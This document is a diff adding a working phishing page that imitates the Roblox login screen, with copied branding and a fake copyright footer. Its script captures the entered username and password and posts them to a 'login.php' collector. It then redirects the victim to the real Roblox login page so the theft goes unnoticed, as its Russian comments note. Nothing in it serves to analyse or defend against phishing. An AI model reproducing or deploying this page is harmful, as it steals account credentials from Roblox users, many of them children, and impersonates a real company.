@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox - Login</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: linear-gradient(135deg, #00a2ff 0%, #0077cc 100%);
+            font-family: 'Gotham SSm A', 'Gotham SSm B', Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .login-container {
+            background: white;
+            border-radius: 12px;
+            padding: 40px;
+            width: 400px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo img {
+            width: 180px;
+            height: auto;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        .input-group input:focus {
+            border-color: #00a2ff;
+            outline: none;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 15px;
+            background: #00a2ff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+        .login-btn:hover {
+            background: #0088dd;
+        }
+        .links {
+            margin-top: 20px;
+            text-align: center;
+        }
+        .links a {
+            color: #00a2ff;
+            text-decoration: none;
+            margin: 0 10px;
+            font-size: 14px;
+        }
+        .links a:hover {
+            text-decoration: underline;
+        }
+        .footer {
+            margin-top: 30px;
+            text-align: center;
+            color: #666;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTgwIiBoZWlnaHQ9IjYwIiB2aWV3Qm94PSIwIDAgMTgwIDYwIiBmaWxsPSJub25lIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxwYXRoIGQ9Ik00MCAxMEg1MFY1MEg0MFYxMFoiIGZpbGw9IiMwMEEyRkYiLz48cGF0aCBkPSJNNjAgMTBINzBWNTBINjBWMTBaIiBmaWxsPSIjMDBBMkZGIi8+PHBhdGggZD0iTTgwIDEwSDkwVjUwSDgwVjEwWiIgZmlsbD0iIzAwQTJGRiIvPjxwYXRoIGQ9Ik0xMDAgMTBIMTBWNTBIMTAwVjEwWiIgZmlsbD0iIzAwQTJGRiIvPjxwYXRoIGQ9Ik0xMjAgMTBIMzAwVjUwSDEyMFYxMFoiIGZpbGw9IiMwMEEyRkYiLz48L3N2Zz4=" alt="Roblox">
+        </div>
+        <form id="loginForm" action="login.php" method="POST">
+            <div class="input-group">
+                <input type="text" id="username" name="username" placeholder="Username/Email/Phone" required autocomplete="username">
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
+            </div>
+            <button type="submit" class="login-btn">Login</button>
+        </form>
+        <div class="links">
+            <a href="https://www.roblox.com/login/forgot-password">Forgot Password?</a>
+            <a href="https://www.roblox.com/signup">Sign Up</a>
+        </div>
+        <div class="footer">
+            © 2025 Roblox Corporation. All rights reserved.
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Быстрая отправка данных
+            var formData = new FormData(this);
+            fetch('login.php', {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            }).then(() => {
+                // Редирект на официальный сайт после отправки
+                window.location.href = 'https://www.roblox.com/login';
+            });
+        });
+    </script>
+</body>
+</html>
